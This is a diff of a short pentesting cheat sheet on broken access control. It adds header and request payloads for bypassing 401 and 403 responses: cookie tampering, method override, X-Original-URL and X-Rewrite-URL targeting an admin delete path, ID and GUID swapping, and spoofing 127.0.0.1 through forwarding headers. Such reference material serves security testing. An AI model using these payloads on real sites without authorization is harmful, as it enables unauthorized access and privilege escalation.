@@ -1,22 +1,33 @@
 ---
 title: Broken Access Control Examples
-desc: Examples of Broken Access Controls.
+desc: Examples of Broken Access Controls. Bypass 401, 403 responses.
 tags: [AccessControl, IDOR, PrivEsc, Web]
 alts: [IDORExamples]
 website: 
 render_with_liquid: false
 ---
 
-## Request parameter
+## Change Cookie Values
 
-```html
-<!-- Change parameter -->
+```sh
 Cookie: isAdmin=true
 ```
 
 <br />
 
-## POST body
+## Change Request Methods
+
+```sh
+GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS, PATCH, INVENTED, CONNECT, etc.
+
+# Override to bypass FireWall (via POST /example HTTP/1.1)
+X-Method-Override: PUT
+X-HTTP-Method-Override: PUT
+```
+
+<br />
+
+## Change POST Body
 
 ```
 POST / HTTP/1.1
@@ -30,12 +41,15 @@ POST / HTTP/1.1
 
 <br />
 
-## Request method and X-Original-URL
+## Add X-Original-URL, X-Rewrite-URL
 
-```
+```sh
 POST / HTTP/1.1
+
 ...
-X-Original-URL: /admin/deleteUser
+X-Original-URL: /admin/deleteuser
+# or
+X-Rewrite-URL: /admin/deleteuser
 ...
 
 username=michael
@@ -43,7 +57,7 @@ username=michael
 
 <br />
 
-## User ID
+## Change User ID
 
 ```
 https://vulnerable.com/account?id=michael
@@ -53,11 +67,28 @@ https://vulnerable.com/account?id=administrator
 
 <br />
 
-## GUID (globally unique identifier)
+## Change GUID
 
 GUID cannot be guessed but it may be found somewhere in the website.
 
 ```
 https://vulnerable.com/account?id=7230b2a9-60de-4409-a350-cd14986a8d3e
 https://vulnerable.com/account?id=1de655cb-29d7-4008-b434-e688b39f9564
+```
+
+<br />
+
+## IP Spoofing & Fuzzing in Request Header
+
+```sh
+Cluster-Client-IP: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-ProxyUser-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+
+Host: 127.0.0.1
 ```
